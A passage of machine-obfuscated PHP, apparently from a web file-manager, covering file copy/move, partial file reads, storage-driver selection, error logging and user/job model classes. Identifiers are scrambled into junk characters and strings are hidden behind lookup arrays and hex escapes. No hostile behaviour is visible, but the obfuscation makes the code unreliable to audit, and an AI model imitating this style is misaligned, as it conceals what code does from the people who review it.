$­§€¹¦ö, $éĞö ëï, $ÙçÂ„Í•); } else { $äÕ¿³³ = self::copyPath($³°Äñ˜î, $®’£­ö, $‘¤İÚÄ’, $ÕéËÔ˜°, $­§€¹¦ö, $éĞö ëï, $»Ñ¾©Ğ³, $ÙçÂ„Í•); } if ($äÕ¿³³ && $éĞö ëï) { $³°Äñ˜î->remove($®’£­ö); } if ($¹½€¸‚) { $äÕ¿³³ = $¹½€¸‚->getPathOuter($äÕ¿³³); } return $äÕ¿³³; } private static function check($›—Èõªã, $÷Îóœñ, $‡¶†Ú®¼, &$‚öª¾ò›) { $Äî†³Å =& $_SERVER[Ñ¯©ç]; if (self::driverIsSame($›—Èõªã, $‡¶†Ú®¼) && $›—Èõªã->isFolder($÷Îóœñ) && $›—Èõªã->isParentOf($÷Îóœñ, $‚öª¾ò›)) { show_json(LNG($Äî†³Å[1210]), !1); } if (!$›—Èõªã->exist($÷Îóœñ)) { show_json(LNG($Äî†³Å[118]), !1); } } private static function copyPath($‰„‰—”™, $Ã´è‰ê’, $‚Ô¸Ş•¹, $ôí³¯°‡, $Õ”¢ƒß, $¹½Ç¸ŒÂ, $ßõ¾Íæ›, $Ìş¾Ñ = false, $‡Óã¨¢ï = true) { $˜á åô‚ =& $_SERVER[Ñ¯©ç]; $ŞÔ¦ ‘¦ = empty($Ìş¾Ñ) && $Ìş¾Ñ !== $˜á åô‚[229] ? $‰„‰—”™->pathThis($Ã´è‰ê’) : $Ìş¾Ñ; if ($Õ”¢ƒß) { $ï‘âÛş· = $‚Ô¸Ş•¹->fileNameExist($ôí³¯°‡, $ŞÔ¦ ‘¦); $É‚ÇŒèè = $ŞÔ¦ ‘¦; $ŞÔ¦ ‘¦ = $‚Ô¸Ş•¹->fileNameAuto($ôí³¯°‡, $ŞÔ¦ ‘¦, $Õ”¢ƒß, !$ßõ¾Íæ›); if (!$ï‘âÛş· || $É‚ÇŒèè != $ŞÔ¦ ‘¦) { $Õ”¢ƒß = !1; } if ($‡Óã¨¢ï && !$Õ”¢ƒß) { $‚Ô¸Ş•¹->_data[$˜á åô‚[1211]] = !0; } } if ($ßõ¾Íæ›) { return self::copyFile($‰„‰—”™, $Ã´è‰ê’, $‚Ô¸Ş•¹, $ôí³¯°‡, $ŞÔ¦ ‘¦, $¹½Ç¸ŒÂ); } if ($Õ”¢ƒß == REPEAT_RENAME_FOLDER) { $Õ”¢ƒß = !1; } $ÌÜÕ’ÆÍ = rtrim($ôí³¯°‡, $˜á åô‚[8]) . $˜á åô‚[8] . $ŞÔ¦ ‘¦; $†§İ†ˆ« = $‚Ô¸Ş•¹->mkdir($‚Ô¸Ş•¹->getPath($ÌÜÕ’ÆÍ), $Õ”¢ƒß); $ôí³¯°‡ = $‚Ô¸Ş•¹->getPathInner($†§İ†ˆ«); $âƒÕ…‘Œ = $‰„‰—”™->listPath($Ã´è‰ê’, !0); $âƒÕ…‘Œ = is_array($âƒÕ…‘Œ) ? $âƒÕ…‘Œ : array($˜á åô‚[96] => array(), $˜á åô‚[95] => array()); $Ôç¾ÅîÉ = array_merge($âƒÕ…‘Œ[$˜á åô‚[96]], $âƒÕ…‘Œ[$˜á åô‚[95]]); foreach ($Ôç¾ÅîÉ as $Ç¸Ô–é¤) { $Èë³’ŠÄ = $Ç¸Ô–é¤[$˜á åô‚[33]] == $˜á åô‚[231]; $Ã´è‰ê’ = $‰„‰—”™->getPathInner($Ç¸Ô–é¤[$˜á åô‚[97]]); $‚°´”¨Û = self::copyPath($‰„‰—”™, $Ã´è‰ê’, $‚Ô¸Ş•¹, $ôí³¯°‡, $Õ”¢ƒß, $¹½Ç¸ŒÂ, $Èë³’ŠÄ, !1, !1); if (!$‚°´”¨Û) { IO::errorTips($˜á åô‚[1212] . $Ã´è‰ê’ . $˜á åô‚[83] . $ôí³¯°‡); } } self::copyMoveKeepInfo($‰„‰—”™, $Ã´è‰ê’, $†§İ†ˆ«); return $†§İ†ˆ«; } private static function copyFile($€Æóï, $Íò–ãú¸, $÷®Œª•, $”–‚´™İ, $ˆ§…Í´„, $¨ŸØ‰Â¼) { $í®¿ÂŞ  =& $_SERVER[Ñ¯©ç]; $”–‚´™İ = $÷®Œª•->getPath(rtrim($”–‚´™İ, $í®¿ÂŞ [8]) . $í®¿ÂŞ [8] . $ˆ§…Í´„); $Ä•¨ÖÈó = $í®¿ÂŞ [1213] . time() . rand_string(5); Hook::trigger($í®¿ÂŞ [1214], $€Æóï, $Íò–ãú¸, $÷®Œª•, $”–‚´™İ, $ˆ§…Í´„, $Ä•¨ÖÈó); if (self::driverIsSame($€Æóï, $÷®Œª•)) { if ($¨ŸØ‰Â¼) { $ãŠû–·« = $÷®Œª•->moveFile($Íò–ãú¸, $”–‚´™İ); } else { $ãŠû–·« = $÷®Œª•->copyFile($Íò–ãú¸, $”–‚´™İ); } Hook::trigger($í®¿ÂŞ [1215], $€Æóï, $Íò–ãú¸, $÷®Œª•, $”–‚´™İ, $ˆ§…Í´„, $ãŠû–·«); self::copyMoveKeepInfo($€Æóï, $Íò–ãú¸, $ãŠû–·«); return $ãŠû–·«; } $¥¢ĞÒÏ´ = TEMP_FILES; if ($GLOBALS[$í®¿ÂŞ [6]][$í®¿ÂŞ [102]][$í®¿ÂŞ [848]]) { $¥¢ĞÒÏ´ = $GLOBALS[$í®¿ÂŞ [6]][$í®¿ÂŞ [102]][$í®¿ÂŞ [848]]; } $ˆöı×ŸÂ = $¥¢ĞÒÏ´; mk_dir($ˆöı×ŸÂ); $„¼Œ¹şã = $ˆöı×ŸÂ . $Ä•¨ÖÈó; $ù´Â½ğ = $„¼Œ¹şã; $„¼Œ¹şã = $€Æóï->download($Íò–ãú¸, $„¼Œ¹şã); $„¼Œ¹şã = $€Æóï->iconvApp($„¼Œ¹şã); if (substr($„¼Œ¹şã, strlen($¥¢ĞÒÏ´)) == $¥¢ĞÒÏ´) { $¨ŸØ‰Â¼ = !0; } $ãŠû–·« = $÷®Œª•->upload($”–‚´™İ, $„¼Œ¹şã, $¨ŸØ‰Â¼); self::remove($ù´Â½ğ); Hook::trigger($í®¿ÂŞ [1215], $€Æóï, $Íò–ãú¸, $÷®Œª•, $”–‚´™İ, $ˆ§…Í´„, $ãŠû–·«); self::copyMoveKeepInfo($€Æóï, $Íò–ãú¸, $ãŠû–·«); return $ãŠû–·«; } private static function copyMoveKeepInfo($ÒÖ¿îèı, $ËÀòú, $šæÚ·ÑŞ) { if (!$šæÚ·ÑŞ) { return; } $†¢Ü§— = $ÒÖ¿îèı->info($ËÀòú); if (!is_array($†¢Ü§—)) { return; } IO::setModifyTime($šæÚ·ÑŞ, $†¢Ü§—[$_SERVER[Ñ¯©ç][98]]); } public static function pathFather($¿ì×ÉÊÃ) { $æä¿ÄŞà = IO::init($¿ì×ÉÊÃ); $¨®ü·ª­ = $æä¿ÄŞà->pathFather($æä¿ÄŞà->path); return $æä¿ÄŞà->getPathOuter($¨®ü·ª­); } public static function fileOut($®öÜ‘¾ş, $¤õÂ¯Ôü = false, $ğ·˜ŠëÁ = false, $Ü¦Ü¥‰Ë = '') { $ëô¿ºóœ = self::driverMake($®öÜ‘¾ş); if ($ëô¿ºóœ->isFileOutServer()) { return $ëô¿ºóœ->fileOutServer($®öÜ‘¾ş, $¤õÂ¯Ôü, $ğ·˜ŠëÁ, $Ü¦Ü¥‰Ë); } return $ëô¿ºóœ->fileOut($®öÜ‘¾ş, $¤õÂ¯Ôü, $ğ·˜ŠëÁ, $Ü¦Ü¥‰Ë); } public static function fileOutImage($Ì‚ÈöÁ, $–Èùúöï = 250) { $„ÑŒş¸– = array(250, 600, 1200, 2000, 3000, 5000); for ($İŸÍÜíö = 0; $İŸÍÜíö < count($„ÑŒş¸–); $İŸÍÜíö++) { if ($İŸÍÜíö == 0 && $–Èùúöï <= $„ÑŒş¸–[$İŸÍÜíö]) { $–Èùúöï = $„ÑŒş¸–[$İŸÍÜíö]; break; } else { if ($–Èùúöï > $„ÑŒş¸–[$İŸÍÜíö - 1] && $–Èùúöï <= $„ÑŒş¸–[$İŸÍÜíö]) { $–Èùúöï = $„ÑŒş¸–[$İŸÍÜíö]; break; } else { if ($İŸÍÜíö == count($„ÑŒş¸–) - 1 && $–Èùúöï > $„ÑŒş¸–[$İŸÍÜíö]) { $–Èùúöï = $„ÑŒş¸–[$İŸÍÜíö]; break; } } } } $£×Ì“‚ = self::driverMake($Ì‚ÈöÁ); if ($£×Ì“‚->isFileOutServer()) { return $£×Ì“‚->fileOutImageServer($Ì‚ÈöÁ, $–Èùúöï); } return $£×Ì“‚->fileOutImage($Ì‚ÈöÁ, $–Èùúöï); } private static function driverIsSame($³‚ƒüÂÏ, $Üê•¨›½) { $óöÕá¯ç =& $_SERVER[Ñ¯©ç]; $½šºéş = $³‚ƒüÂÏ->getType(); $Â“¯é’ò = $Üê•¨›½->getType(); if ($½šºéş != $Â“¯é’ò) { return !1; } if ($½šºéş == $óöÕá¯ç[810]) { return !0; } if ($½šºéş == $óöÕá¯ç[119]) { return !0; } if ($³‚ƒüÂÏ->pathDriver == $Üê•¨›½->pathDriver) { return !0; } return !1; } public static function copyUpdate($Ì¯«šû„, $¦Ëç“ØÛ) { $“Ğ‰Ù½ï =& $_SERVER[Ñ¯©ç]; if (!IO::exist($Ì¯«šû„)) { return !1; } if (!IO::exist($¦Ëç“ØÛ)) { IO::mkdir($¦Ëç“ØÛ); } $Ù•×¯ó™ = array_to_keyvalue(self::listAllSimple($Ì¯«šû„), $“Ğ‰Ù½ï[97]); $… Ÿğ¤À = array_to_keyvalue(self::listAllSimple($¦Ëç“ØÛ), $“Ğ‰Ù½ï[97]); $­€æøºµ = array(); $˜¯„Ù“ª = array(); foreach ($Ù•×¯ó™ as $ö¢‚‹¦ => $•‘˜°üÈ) { if (isset($… Ÿğ¤À[$ö¢‚‹¦])) { if ($•‘˜°üÈ[$“Ğ‰Ù½ï[88]] == 1) { continue; } if ($… Ÿğ¤À[$ö¢‚‹¦][$“Ğ‰Ù½ï[89]] == $•‘˜°üÈ[$“Ğ‰Ù½ï[89]]) { continue; } } if ($•‘˜°üÈ[$“Ğ‰Ù½ï[88]] == 1) { $˜¯„Ù“ª[] = $¦Ëç“ØÛ . $“Ğ‰Ù½ï[8] . trim($ö¢‚‹¦, $“Ğ‰Ù½ï[8]); continue; } $öï®‹¥ = strstr(trim($ö¢‚‹¦, $“Ğ‰Ù½ï[8]), $“Ğ‰Ù½ï[8]) ? get_path_father($ö¢‚‹¦) : $“Ğ‰Ù½ï[12]; $­€æøºµ[] = array($“Ğ‰Ù½ï[1216] => $•‘˜°üÈ[$“Ğ‰Ù½ï[99]], $“Ğ‰Ù½ï[1217] => rtrim($¦Ëç“ØÛ, $“Ğ‰Ù½ï[8]) . $“Ğ‰Ù½ï[8] . $öï®‹¥, $“Ğ‰Ù½ï[1218] => $•‘˜°üÈ); } $âçüš‚Ü = array($“Ğ‰Ù½ï[231] => $­€æøºµ, $“Ğ‰Ù½ï[88] => $˜¯„Ù“ª); Hook::trigger($“Ğ‰Ù½ï[1219], $Ì¯«šû„, $¦Ëç“ØÛ, $âçüš‚Ü); foreach ($˜¯„Ù“ª as $•‘˜°üÈ) { IO::mkdir($•‘˜°üÈ); } foreach ($­€æøºµ as $•‘˜°üÈ) { IO::copy($•‘˜°üÈ[$“Ğ‰Ù½ï[1216]], $•‘˜°üÈ[$“Ğ‰Ù½ï[1217]], REPEAT_REPLACE); } } public static function fileSubstr($Ù“ü‘¹İ, $ îóí™Ñ, $ï›Ä¬Ì¬ = false) { $ù¨ƒË…Î =& $_SERVER[Ñ¯©ç]; $óšÃüÜ› = self::driverMake($Ù“ü‘¹İ); $Ìè‚ñã = $óšÃüÜ›->size($Ù“ü‘¹İ); $µê¿òéë = $ îóí™Ñ; $Ÿåñô©– = $ï›Ä¬Ì¬; if ($ îóí™Ñ < 0) { $ îóí™Ñ = $Ìè‚ñã + $ îóí™Ñ; } if ($ï›Ä¬Ì¬ === !1) { $ï›Ä¬Ì¬ = $Ìè‚ñã - $ îóí™Ñ; } if ($ îóí™Ñ + $ï›Ä¬Ì¬ > $Ìè‚ñã) { $ï›Ä¬Ì¬ = $Ìè‚ñã - $ îóí™Ñ; } if (!$Ìè‚ñã && $óšÃüÜ›->getType() == $ù¨ƒË…Î[119] && !$óšÃüÜ›->exist($Ù“ü‘¹İ)) { $˜’Æç× = get_path_this($Ù“ü‘¹İ); $ÙÂµŒìñ = parse_url_query($˜’Æç×); if (is_array($ÙÂµŒìñ) && isset($ÙÂµŒìñ[$ù¨ƒË…Î[32]])) { $˜’Æç× = urldecode($ÙÂµŒìñ[$ù¨ƒË…Î[32]]); } throw new Exception($ù¨ƒË…Î[1220] . LNG($ù¨ƒË…Î[1221]) . $ù¨ƒË…Î[1019] . clear_html($˜’Æç×) . $ù¨ƒË…Î[12]); } if ($ï›Ä¬Ì¬ <= 0) { return $ù¨ƒË…Î[12]; } if ($ îóí™Ñ < 0 || $ îóí™Ñ >= $Ìè‚ñã || $ï›Ä¬Ì¬ > 1024 * 1024 * 10) { throw new Exception("\146\151\x6c\145\122\145\x61\x64\x20\x65\x72\x72\157\x72\x21\x20\x73\164\141\162\164\x3d{$ îóí™Ñ}\x3b\x6c\x65\156\x67\164\150\x3d{$ï›Ä¬Ì¬}\x3b\x20\x73\151\172\x65\x3d{$Ìè‚ñã}\x3b"); } $’¿‡„Á = $óšÃüÜ›->fileSubstr($Ù“ü‘¹İ, $ îóí™Ñ, $ï›Ä¬Ì¬); if (!$’¿‡„Á && $ï›Ä¬Ì¬ && isset($GLOBALS[$ù¨ƒË…Î[1222]])) { throw new Exception($GLOBALS[$ù¨ƒË…Î[1222]][$ù¨ƒË…Î[1223]]); } return $’¿‡„Á; } private static function driverMake(&$€ÀŠ‘) { $Ïš×ÌÚü =& $_SERVER[Ñ¯©ç]; $Ÿ°“øõÛ = KodIO::parse($€ÀŠ‘); if (!self::$driverListSystem) { $ŸŸ¾»­· = Model($Ïš×ÌÚü[820])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ŸŸ¾»­·, $Ïš×ÌÚü[458]); } if ($Ÿ°“øõÛ[$Ïš×ÌÚü[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Ÿ°“øõÛ[$Ïš×ÌÚü[458]]]) { throw new Exception($Ïš×ÌÚü[1224]); return !1; } $€ÀŠ‘ = $Ÿ°“øõÛ[$Ïš×ÌÚü[1225]]; $î «¸§ = self::driverGet($Ÿ°“øõÛ, $€ÀŠ‘); return $î «¸§; } private static function driverGet($¦Ÿ·Ã™‘, &$‡ç…«Ø) { $‹á„Ê¦Å =& $_SERVER[Ñ¯©ç]; $°ßœ‰ıö = $¦Ÿ·Ã™‘[$‹á„Ê¦Å[1226]]; $Æ§ú½Æ‚ = $¦Ÿ·Ã™‘[$‹á„Ê¦Å[458]]; switch ($¦Ÿ·Ã™‘[$‹á„Ê¦Å[33]]) { case KodIO::KOD_IO: $…æä®ªü = self::$driverListSystem[$Æ§ú½Æ‚]; break; case KodIO::KOD_SOURCE: $‡ç…«Ø = $Æ§ú½Æ‚ . $‡ç…«Ø; $…æä®ªü = array($‹á„Ê¦Å[1227] => $‹á„Ê¦Å[1228], $‹á„Ê¦Å[6] => $¦Ÿ·Ã™‘); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $³óÑôÔı = $GLOBALS[$‹á„Ê¦Å[1229]]; self::$driverListUser = array_to_keyvalue($³óÑôÔı, $‹á„Ê¦Å[458]); } $…æä®ªü = self::$driverListUser[$Æ§ú½Æ‚]; break; case KodIO::KOD_SHARE_LINK: $…æä®ªü = array($‹á„Ê¦Å[1227] => $‹á„Ê¦Å[1230], $‹á„Ê¦Å[6] => $¦Ÿ·Ã™‘); $Ûöø§¼Ğ = Action($‹á„Ê¦Å[1231])->sharePathInfo($¦Ÿ·Ã™‘[$‹á„Ê¦Å[97]]); $‡ç…«Ø = $Ûöø§¼Ğ[$‹á„Ê¦Å[194]]; if (!$Ûöø§¼Ğ[$‹á„Ê¦Å[194]]) { $Î‡î…ğ‰ = Model($‹á„Ê¦Å[647])->getInfo($Ûöø§¼Ğ[$‹á„Ê¦Å[648]]); $‡ç…«Ø = KodIO::clear($Î‡î…ğ‰[$‹á„Ê¦Å[1232]] . $¦Ÿ·Ã™‘[$‹á„Ê¦Å[1225]]); $¦Ÿ·Ã™‘[$‹á„Ê¦Å[544]] = $Î‡î…ğ‰; $¦Ÿ·Ã™‘[$‹á„Ê¦Å[1207]] = $‡ç…«Ø; $…æä®ªü = array($‹á„Ê¦Å[1227] => $‹á„Ê¦Å[1233], $‹á„Ê¦Å[6] => $¦Ÿ·Ã™‘); } break; case KodIO::KOD_SHARE_ITEM: $…æä®ªü = array($‹á„Ê¦Å[1227] => $‹á„Ê¦Å[1234], $‹á„Ê¦Å[6] => $¦Ÿ·Ã™‘); $Î‡î…ğ‰ = Model($‹á„Ê¦Å[647])->getInfo($¦Ÿ·Ã™‘[$‹á„Ê¦Å[458]]); if ($Î‡î…ğ‰[$‹á„Ê¦Å[194]] == $‹á„Ê¦Å[229]) { $‡ç…«Ø = KodIO::clear($Î‡î…ğ‰[$‹á„Ê¦Å[1232]] . $¦Ÿ·Ã™‘[$‹á„Ê¦Å[1225]]); $¦Ÿ·Ã™‘[$‹á„Ê¦Å[544]] = $Î‡î…ğ‰; $¦Ÿ·Ã™‘[$‹á„Ê¦Å[1207]] = $‡ç…«Ø; $…æä®ªü = array($‹á„Ê¦Å[1227] => $‹á„Ê¦Å[1235], $‹á„Ê¦Å[6] => $¦Ÿ·Ã™‘); } else { if (!$‡ç…«Ø) { $‡ç…«Ø = $Î‡î…ğ‰[$‹á„Ê¦Å[194]]; } } break; default: $‡ç…«Ø = $¦Ÿ·Ã™‘[$‹á„Ê¦Å[97]]; $…æä®ªü = array($‹á„Ê¦Å[1227] => $‹á„Ê¦Å[1236]); break; } $‰Ôû‹÷ = $¦Ÿ·Ã™‘[$‹á„Ê¦Å[97]]; if (!isset(self::$driverCache[$‰Ôû‹÷])) { $¡½½¥… = strtolower($…æä®ªü[$‹á„Ê¦Å[108]]); $¿Ëê“» = $GLOBALS[$‹á„Ê¦Å[6]][$‹á„Ê¦Å[102]][$‹á„Ê¦Å[878]]; $›´ƒèóé = $‹á„Ê¦Å[87] . (isset($¿Ëê“»[$¡½½¥…]) ? $¿Ëê“»[$¡½½¥…] : ucfirst($¡½½¥…)); if (!class_exists($›´ƒèóé)) { show_json("{$›´ƒèóé}\x20\x6e\x6f\164\x20\145\x78\151\163\x74\163\41", !1); } $–™‡ğ®Å = isset($…æä®ªü[$‹á„Ê¦Å[6]]) ? $…æä®ªü[$‹á„Ê¦Å[6]] : !1; self::$driverCache[$‰Ôû‹÷] = new $›´ƒèóé($–™‡ğ®Å); } $Øˆ‹¯¯ = self::$driverCache[$‰Ôû‹÷]; $Øˆ‹¯¯->pathDriver = $°ßœ‰ıö; $Øˆ‹¯¯->pathBase = $‹á„Ê¦Å[12]; if (isset($…æä®ªü[$‹á„Ê¦Å[6]][$‹á„Ê¦Å[1237]])) { $Øˆ‹¯¯->pathBase = rtrim($…æä®ªü[$‹á„Ê¦Å[6]][$‹á„Ê¦Å[1237]], $‹á„Ê¦Å[8]) . $‹á„Ê¦Å[8]; $‡ç…«Ø = $Øˆ‹¯¯->pathBase . ltrim($‡ç…«Ø, $‹á„Ê¦Å[8]); } $‡ç…«Ø = $Øˆ‹¯¯->getPath($‡ç…«Ø); if (isset($¦Ÿ·Ã™‘[$‹á„Ê¦Å[1207]])) { $‡ç…«Ø = $¦Ÿ·Ã™‘[$‹á„Ê¦Å[1207]]; } $Øˆ‹¯¯->path = $‡ç…«Ø; return $Øˆ‹¯¯; } public static function errorTips($ŒÀÛÙİË = false) { $­ª‚¨ûÛ =& $_SERVER[Ñ¯©ç]; static $«Šì’Â˜ = array(); $§‘í¯ğ² = 1000; if ($ŒÀÛÙİË === -1) { return $«Šì’Â˜ ? $«Šì’Â˜[count($«Šì’Â˜) - 1] : $­ª‚¨ûÛ[12]; } if ($ŒÀÛÙİË === !1) { return implode($­ª‚¨ûÛ[59], $«Šì’Â˜); } if (count($«Šì’Â˜) >= $§‘í¯ğ²) { $«Šì’Â˜ = array_slice($«Šì’Â˜, $§‘í¯ğ² * 0.5, $§‘í¯ğ²); } $«Šì’Â˜[] = $ŒÀÛÙİË; write_log($­ª‚¨ûÛ[176] . ACTION . $­ª‚¨ûÛ[1238] . $ŒÀÛÙİË, $­ª‚¨ûÛ[1239]); } public static function getLastError($¸çÑ¯ö = '') { $é„„ˆ½ì = self::errorTips(-1); return $é„„ˆ½ì ? $é„„ˆ½ì : $¸çÑ¯ö; } } goto c­ğÍÎÚ‡·; b™‰ˆ®ö±: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\152\157\x62\x4c\x69\x73\164"; public $field = array("\156\141\155\x65", "\144\x65\x73\x63", "\163\157\x72\x74"); const JOB_KEY = "\163\145\154\x66\x4a\157\x62\x4c\151\163\164"; public function listData($Èù»¾áì = false, $¤˜Üå“« = "\163\157\x72\x74", $¬Øêïç£ = false) { return parent::listData($Èù»¾áì, $¤˜Üå“«, $¬Øêïç£); } public function remove($èÜ§ÍÀ¿) { return parent::remove($èÜ§ÍÀ¿); } public function add($ö×¿Ôø£) { $©ŒÃ’Íº =& $_SERVER[Ñ¯©ç]; if ($this->findByName($ö×¿Ôø£[$©ŒÃ’Íº[32]])) { return !1; } $ö×¿Ôø£[$©ŒÃ’Íº[1979]] = $this->getSort(); return parent::insert($ö×¿Ôø£); } private function getSort() { $–“¦ÉŞ =& $_SERVER[Ñ¯©ç]; $è§ÚûÔÆ = parent::listData(); $™æšòÙ = array_to_keyvalue($è§ÚûÔÆ, $–“¦ÉŞ[12], $–“¦ÉŞ[1979]); return empty($™æšòÙ) ? 0 : max($™æšòÙ) + 1; } public function update($‚Ú’øªÛ, $Å•Ë¨±) { $ëÅÕäà =& $_SERVER[Ñ¯©ç]; $ìíÍÓş = parent::listData($‚Ú’øªÛ); $©¶“õé° = $this->findByName($Å•Ë¨±[$ëÅÕäà[32]]); if (!$ìíÍÓş || $©¶“õé° && $©¶“õé°[$ëÅÕäà[458]] != $ìíÍÓş[$ëÅÕäà[458]]) { return !1; } return parent::update($‚Ú’øªÛ, $Å•Ë¨±); } public function setUserJob($´’»¹«, $æÉ‚†™ì) { $Å†‚œ´© =& $_SERVER[Ñ¯©ç]; if (!is_array($æÉ‚†™ì)) { $æÉ‚†™ì = array($æÉ‚†™ì); } $âÜµ¢Ü” = parent::listData(); $‹çè†Á = array_to_keyvalue($âÜµ¢Ü”, $Å†‚œ´©[32]); $‹ˆè„°¬ = $Å†‚œ´©[63]; foreach ($æÉ‚†™ì as $‘Û›£œË) { if ($‹çè†Á[$‘Û›£œË]) { $‹ˆè„°¬ .= $‹çè†Á[$‘Û›£œË][$Å†‚œ´©[458]] . $Å†‚œ´©[50]; } else { $üì¾¬Ñ‰ = $this->add($‘Û›£œË); $‹ˆè„°¬ .= $üì¾¬Ñ‰ . $Å†‚œ´©[50]; } } $‹ˆè„°¬ = rtrim($‹ˆè„°¬, $Å†‚œ´©[50]); Model($Å†‚œ´©[582])->metaSet($´’»¹«, self::JOB_KEY, $‹ˆè„°¬); } public function getUserJob($ûõ¯Ûµ) { $ıÇØ²¡¢ = Model($_SERVER[Ñ¯©ç][582])->metaGet($ûõ¯Ûµ); return $this->getUserJobInfo($ıÇØ²¡¢[self::JOB_KEY]); } public function getUserJobInfo($ä»õõÈä) { $¾£±†İ– =& $_SERVER[Ñ¯©ç]; $Ş»Ş´Ê¡ = explode($¾£±†İ–[50], $ä»õõÈä); $—ÒÁ‹µ = parent::listData(); $—ÒÁ‹µ = array_remove_key($—ÒÁ‹µ, $¾£±†İ–[232]); $çôÒ“ù‚ = array(); foreach ($Ş»Ş´Ê¡ as $òşíîÔÚ) { if (isset($—ÒÁ‹µ[$òşíîÔÚ])) { $çôÒ“ù‚[] = $—ÒÁ‹µ[$òşíîÔÚ]; } } return $çôÒ“ù‚; } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\x72"; protected $tableMeta = array("\164\x61\142\x6c\145\x4e\141\x6d\145" => "\165\x73\145\x72\137\155\145\164\x61", "\155\145\164\141\106\x69\145\154\x64" => "\x75\x73\145\162\111\104"); protected $simpleField = "\165\x73\145\x72\111\x44\54\156\x69\x63\153\x4e\141\155\x65\x2c\x6e\141\x6d\x65\x2c\x61\x76\141\x74\x61\162\54\x73\x65\x78\x2c\x73\164\141\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¶ùá‰Š˜) { $¨š‘¾É¸ =& $_SERVER[Ñ¯©ç]; $¬şÕñà = $¨š‘¾É¸[2431]; return array($¨š‘¾É¸[2034] => array($¶ùá‰Š˜[0], $¬şÕñà), $¨š‘¾É¸[2036] => array($¶ùá‰Š˜[0], $¬şÕñà), $¨š‘¾É¸[2432] => array($¶ùá‰Š˜[0], $¬şÕñà)); } protected function getInfo($èÊ™şá©, $§‡‘¿ğœ = false) { $Íûç™¢ï = $this->getInfoSimple($èÊ™şá©); if (!is_array($Íûç™¢ï)) { return array(); } if ($§‡‘¿ğœ) { return $this->_getInfoApply($Íûç™¢ï); } return $this->cacheFunctionGet($_SERVER[Ñ¯©ç][2038], $èÊ™şá©); } protected function getInfoFull($Ì÷ÅØ«, $ïçÔî¡» = false) { $ÍÎìÁõ– = $this->getInfoSimple($Ì÷ÅØ«); if (!is_array($ÍÎìÁõ–)) { return array(); } if ($ïçÔî¡») { return $this->_getInfoApply($ÍÎìÁõ–, !0); } return $this->cacheFunctionGet($_SERVER[Ñ¯©ç][2433], $Ì÷ÅØ«); } private function _getInfoApply($ÉÚâÄµ©, $İ‡éÌâê = false) { $»œÁóƒ¿ =& $_SERVER[Ñ¯©ç]; if (!$ÉÚâÄµ©) { return $ÉÚâÄµ©; } $’ÁÓâšç = md5($»œÁóƒ¿[2434] . $ÉÚâÄµ©[$»œÁóƒ¿[942]] . $»œÁóƒ¿[2435] . $ÉÚâÄµ©[$»œÁóƒ¿[32]]); $ÉÚâÄµ© = $this->_listDataApplyItem($ÉÚâÄµ©); $Ó¨îşë = Model($»œÁóƒ¿[1391])->metaGet($ÉÚâÄµ©[$»œÁóƒ¿[100]][$»œÁóƒ¿[194]]); $ÉÚâÄµ©[$»œÁóƒ¿[2436]] = $’ÁÓâšç; $ÉÚâÄµ©[$»œÁóƒ¿[100]][$»œÁóƒ¿[2232]] = isset($Ó¨îşë[$»œÁóƒ¿[2233]]) ? $Ó¨îşë[$»œÁóƒ¿[2233]] : null; if ($İ‡éÌâê) { $ÉÚâÄµ©[$»œÁóƒ¿[522]] = $this->metaGet($ÉÚâÄµ©[$»œÁóƒ¿[1757]]); } return $ÉÚâÄµ©; } protected function getInfoSimple($ˆç¾Ã™Ä, $ğï‚±¬± = false) { $çŞ«˜Ø =& $_SERVER[Ñ¯©ç]; if (!$ˆç¾Ã™Ä) { return array(); } if ($ğï‚±¬±) { $õ„¯ÒƒÛ = $this->where(array($çŞ«˜Ø[1757] => intval($ˆç¾Ã™Ä)))->find(); if (!is_array($õ„¯ÒƒÛ)) { return array(); } $õ„¯ÒƒÛ[$çŞ«˜Ø[2437]] = Action($çŞ«˜Ø[2438])->parseUrl($õ„¯ÒƒÛ[$çŞ«˜Ø[2437]]); return $õ„¯ÒƒÛ; } return $this->cacheFunctionGet($çŞ«˜Ø[2039], $ˆç¾Ã™Ä); } protected function getInfoSimpleOuter($§ÈİÁ¹) { $ËÚò¦€“ =& $_SERVER[Ñ¯©ç]; if (!$§ÈİÁ¹ || $§ÈİÁ¹ == 0) { return array($ËÚò¦€“[1757] => $ËÚò¦€“[229], $ËÚò¦€“[32] => $ËÚò¦€“[176] . LNG($ËÚò¦€“[2439]) . $ËÚò¦€“[178], $ËÚò¦€“[2437] => STATIC_PATH . $ËÚò¦€“[2440]); } $ÛåºûÀà = $this->cacheFunctionGet($ËÚò¦€“[2039], $§ÈİÁ¹); $£ ï®î½ = array_field_key($ÛåºûÀà, explode($ËÚò¦€“[50], $this->simpleField)); if (!$£ ï®î½) { return array($ËÚò¦€“[1757] => $ËÚò¦€“[1245], $ËÚò¦€“[32] => $ËÚò¦€“[176] . LNG($ËÚò¦€“[2441]) . $ËÚò¦€“[178], $ËÚò¦€“[2437] => STATIC_PATH . $ËÚò¦€“[2442]); } $£ ï®î½[$ËÚò¦€“[2437]] = Action($ËÚò¦€“[2438])->parseUrl($£ ï®î½[$ËÚò¦€“[2437]]); return $£ ï®î½; } protected function groupUser($„´’ØÄÆ) { } public static function errorLang($‰ïÏÉî) { $ËîÈ¯İ× =& $_SERVER[Ñ¯©ç]; $ı——ÒÓ = array(self::ERROR_USER_NOT_EXISTS => $ËîÈ¯İ×[2443], self::ERROR_USER_PASSWORD_ERROR => $ËîÈ¯İ×[2444], self::ERROR_USER_EXIST_NAME => $ËîÈ¯İ×[2445], self::ERROR_USER_EXIST_PHONE => $ËîÈ¯İ×[2446], self::ERROR_USER_EXIST_EMAIL => $ËîÈ¯İ×[2447], self::ERROR_USER_LOGIN_LOCK => $ËîÈ¯İ×[2448], self::ERROR_IP_NOT_ALLOW => $ËîÈ¯İ×[2449], self::ERROR_USER_EXIST_NICKNAME => 